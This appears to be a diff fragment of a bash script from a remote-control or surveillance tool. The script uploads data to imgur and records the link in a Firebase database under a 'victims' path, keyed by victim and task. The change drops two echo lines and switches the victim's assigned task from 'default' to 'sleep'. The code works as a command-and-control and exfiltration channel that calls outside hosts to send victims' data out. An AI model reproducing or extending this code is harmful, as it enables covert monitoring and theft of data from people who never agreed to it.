@@ -41,9 +41,6 @@ delete_hash="${delete_hash%%</deletehash>*}"
 url=`echo $url | sed 's/^http:/https:/'`
 dpage="https://imgur.com/delete/$delete_hash"
 
-echo $url
-echo $dpage
-
 timestamp=`date +"%Y-%m-%d_%H-%M-%S"`
 
 curl -X PUT -d "
@@ -53,7 +50,7 @@ curl -X PUT -d "
  }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID/$timestamp.json"
 
 #If you want to swap to another task, you can do it like so:
-setVictimTask "$victim" "default"
+setVictimTask "$victim" "sleep"
 
 ###############################################################################
 
